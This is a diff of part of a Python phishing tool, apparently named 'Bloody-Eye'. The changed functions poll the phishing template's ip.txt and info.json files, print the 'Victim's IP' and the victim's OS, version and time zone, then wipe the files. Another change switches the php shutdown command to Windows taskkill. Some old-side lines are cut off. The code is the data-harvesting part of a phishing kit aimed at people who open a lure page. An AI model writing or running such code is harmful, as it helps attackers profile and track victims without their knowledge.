@@ -577,15 +577,15 @@ exit();""")
 # Getting IP Address
     def readip():
         global stat_file
-        if not str(os.stat('../Bloody-Eye/templates/phishing/ip.txt')>
-            stat_file = str(os.stat('../Bloody-Eye/templates/phishing>
-            fileip =  open('../Bloody-Eye/templates/phishing/ip.txt',>
+        if not str(os.stat('../Bloody-Eye/templates/phishing/ip.txt').st_size) == stat_file:
+            stat_file = str(os.stat('../Bloody-Eye/templates/phishing/ip.txt').st_size)
+            fileip =  open('../Bloody-Eye/templates/phishing/ip.txt','r')
             i = fileip.readlines()
             try:
                 i = i[-1]
-                print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+>
-                print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+>
-                o = open("../Bloody-Eye/templates/phishing/ip.txt","w>
+                print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.GREEN+" Victim's IP Found")
+                print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.BLUE+" Victim's IP : "+Fore.GREEN+"%s"%(i))
+                o = open("../Bloody-Eye/templates/phishing/ip.txt","w")
                 o.write("")
                 o.close()
             except:
@@ -593,18 +593,18 @@ exit();""")
 # Getting Victim Info
     def info():
             global stat_file
-            if not str(os.stat('../Bloody-Eye/templates/phishing/info>
-                stat_file = str(os.stat('../Bloody-Eye/templates/phis>
-                fileip = open("../Bloody-Eye/templates/phishing/info.>
+            if not str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size) == stat_file:
+                stat_file = str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size)
+                fileip = open("../Bloody-Eye/templates/phishing/info.json","r")
                 b = fileip.read()
             try:
                 infor = json.loads(b)
                 for value in infor['dev']:
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+>
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+>
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+>
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+>
-                    a = open("../Bloody-Eye/templates/phishing/info.j>
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Name : "+Fore.WHITE+value['Os                                  >
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Version : "+Fore.WHITE+value[                                  >
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Time Zone : "+Fore.WHITE+value['                                  >
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Version : "+Fore.WHITE+value[                                  >
+                    a = open("../Bloody-Eye/templates/phishing/info.json","w")
                     b = a.write("")
                     a.close()
             except:
@@ -614,13 +614,10 @@ exit();""")
         readip()
         info()
   except:
-     with open("logs/exit","w") as kill:
-        Popen(("killall","-KILL","php"),stdout=kill,stderr=kill)
-        print(" ")
-        sys.exit()
-
-
-    
+    with open("exit","w") as kill:
+      Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
+      os.system("clear")
+      sys.exit()
 def github():
   try:
     path=("""<!DOCTYPE html>
